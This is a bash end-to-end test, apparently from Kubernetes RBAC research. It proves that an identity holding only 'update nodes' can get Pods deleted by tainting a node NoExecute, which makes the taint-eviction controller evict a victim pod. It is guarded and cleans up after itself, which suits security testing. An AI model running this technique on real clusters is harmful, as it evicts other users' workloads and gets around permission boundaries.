#!/usr/bin/env bash
# Implicit permission: update/patch/delete nodes -> delete pods  (node-deletes-pods)
# Severity: CRITICAL (update/patch nodes -> delete pods via taint eviction),
#           HIGH/DoS (delete nodes -> delete pods via Pod GC).
#
# Proof: an identity granted ONLY `update nodes` (NOT `delete pods`) adds a
# `NoExecute` taint to the Node; the taint-eviction controller then deletes
# every Pod on that Node that does not tolerate the taint -- the exact
# `deletePodHandler` path the paper names in CCS'25 Sec 4.5.2. The attacker
# never holds `delete pods`, yet the control plane deletes Pods on its behalf.
# Mechanism: ../transitions/node-deletes-pods.md
#
# !!! NODE-TOUCHING: tainting the single shared node evicts OTHER authors' pods.
# DO NOT RUN on the shared cluster. The parent runs it isolated. The guard below
# exits 3 before any mutation; the real body is reachable only when run alone
# (WP_E2E_ALLOW_NODE=1).
source "$(dirname "$0")/../lib.sh"
if [ "${WP_E2E_ALLOW_NODE:-}" != "1" ]; then
  echo "RESULT: SKIP node-deletes-pods mutates shared node; parent runs it isolated"
  exit 3
fi

test_start "node-deletes-pods"

node="$(K get nodes -o jsonpath='{.items[0].metadata.name}')"
assert_nonempty "$node" "found the node to target"
TAINT_KEY="wp-evict-${RUN_ID}"

# Guarantee we remove our taint AND our namespaces no matter how the test ends
# (new_ns's _track is lost to its subshell under bash 4.2 + set -u, so _cleanup
# alone would not delete the namespaces; isolation protects other authors only
# between runs). This keeps the node clean afterward.
WP_OBJS=()
wp_track() { WP_OBJS+=("$1"); }
_untaint() { K taint nodes "$node" "${TAINT_KEY}=1:NoExecute-" >/dev/null 2>&1 || true; }
wp_cleanup() {
  local rc=$? o
  _untaint
  for o in "${WP_OBJS[@]:-}"; do [ -n "$o" ] && K delete "$o" --ignore-not-found --wait=false >/dev/null 2>&1 || true; done
  _cleanup || true
  return $rc
}
trap wp_cleanup EXIT

ns="$(new_ns node-del-pods)"; wp_track "namespace/$ns"

# A victim Pod pinned to the node, WITHOUT a toleration for our taint, so the
# taint-eviction controller will delete it. automountServiceAccountToken off.
step "admin creates a running victim Pod on $node (no toleration for $TAINT_KEY)"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create victim pod"
apiVersion: v1
kind: Pod
metadata: { name: victim }
spec:
  nodeName: $node
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 1
  tolerations:
  - { key: node.kubernetes.io/not-ready,    operator: Exists, effect: NoExecute }
  - { key: node.kubernetes.io/unreachable,  operator: Exists, effect: NoExecute }
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
EOF
wait_pod_running "$ns" victim 90

home_ns="$(new_ns node-del-home)"; wp_track "namespace/$home_ns"
mk_sa "$home_ns" attacker
subj="$(sa_subject "$home_ns" attacker)"
# ONLY update/patch/get nodes cluster-wide. Deliberately NO `delete pods`.
grant_cluster "$home_ns" attacker "" "nodes" "update,patch,get,list"

assert_can    "$subj" update nodes            # holds p
assert_cannot "$subj" delete pods "$ns"       # THE GAP: lacks q

step "attacker taints $node with ${TAINT_KEY}=1:NoExecute (an 'update nodes' only)"
as_subj "$subj" taint nodes "$node" "${TAINT_KEY}=1:NoExecute" --overwrite >/dev/null \
  || fail "attacker could not taint the node"

# EFFECT: the taint-eviction controller deletes the non-tolerating victim Pod
# on the attacker's behalf -- a `delete pods` the attacker never held.
wait_gone "$ns" pod victim 120
step "taint-eviction controller deleted the Pod after an 'update nodes' taint the attacker made without 'delete pods'"

_untaint
test_pass
